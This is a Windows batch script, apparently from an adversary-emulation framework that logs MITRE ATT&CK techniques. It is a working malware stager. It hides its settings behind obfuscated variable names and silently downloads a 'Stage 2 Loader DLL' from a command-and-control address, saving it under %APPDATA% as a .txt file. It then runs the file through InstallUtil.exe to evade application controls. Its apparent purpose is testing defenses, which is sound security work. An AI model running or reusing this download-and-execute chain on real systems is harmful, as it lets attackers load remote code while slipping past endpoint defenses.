@echo off
setlocal enabledelayedexpansion

REM ============================================================
REM Obfuscated SET variable preamble (PHR_ placeholders)
REM ============================================================
SET akjdh=%APPDATA%\10350\ab42edc7
SET mnbvf=2191f944.txt
SET qwzxc=https://10.0.0.49/stage/2/icon.png?10350-7
SET plkmj=ITZEL-S2BO
SET vbnmc=10350
SET ghzxp=7
SET zxqwe=%APPDATA%\7
SET rtyui=%APPDATA%\7\macula-simulations.log

REM Construct log file path from 7
SET lkjhg=%APPDATA%\!ghzxp!\macula-simulations.log

REM Cache timestamp for debug logging (use delayed expansion)
SET tsvar=!DATE!/!TIME!

REM ============================================================
REM Debug: heartbeat fetch start
REM ============================================================
echo [!tsvar!][DEBUG][%plkmj%][%vbnmc%]: heartbeat_start >> "!lkjhg!" 2>nul

REM Download Stage 2 Loader DLL from C2
curl -k -s -o "!akjdh!\!mnbvf!" "!qwzxc!" >nul 2>&1

REM Debug: heartbeat complete
echo [!tsvar!][DEBUG][%plkmj%][%vbnmc%]: heartbeat_complete >> "!lkjhg!" 2>nul

REM ============================================================
REM Change to output directory
REM ============================================================
echo [!tsvar!][DEBUG][%plkmj%][%vbnmc%]: chdir_start >> "!lkjhg!" 2>nul
cd /d "!akjdh!" >nul 2>&1
echo [!tsvar!][DEBUG][%plkmj%][%vbnmc%]: chdir_result=!ERRORLEVEL! >> "!lkjhg!" 2>nul

REM ============================================================
REM LOLBIN invocation via InstallUtil.exe /U
REM ============================================================
echo [!tsvar!][DEBUG][%plkmj%][%vbnmc%]: installutil_start >> "!lkjhg!" 2>nul
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U "!akjdh!\!mnbvf!" >NUL 2>&1
SET installutil_exit=!ERRORLEVEL!
echo [!tsvar!][DEBUG][%plkmj%][%vbnmc%]: installutil_result=!installutil_exit! >> "!lkjhg!" 2>nul

REM ============================================================
REM TTP Logging
REM ============================================================
REM T1218 - System Binary Proxy Execution
if !installutil_exit! EQU 0 (
    echo [!tsvar!][TTP][%plkmj%][%vbnmc%]: T1218^|System Binary Proxy Execution=[OK]:[] >> "!lkjhg!" 2>nul
) else (
    echo [!tsvar!][TTP][%plkmj%][%vbnmc%]: T1218^|System Binary Proxy Execution=[FAIL]:[installutil_exit_nonzero] >> "!lkjhg!" 2>nul
)

REM T1027 - Obfuscated Files or Information (unconditional success)
echo [!tsvar!][TTP][%plkmj%][%vbnmc%]: T1027^|Obfuscated Files or Information=[OK]:[] >> "!lkjhg!" 2>nul

endlocal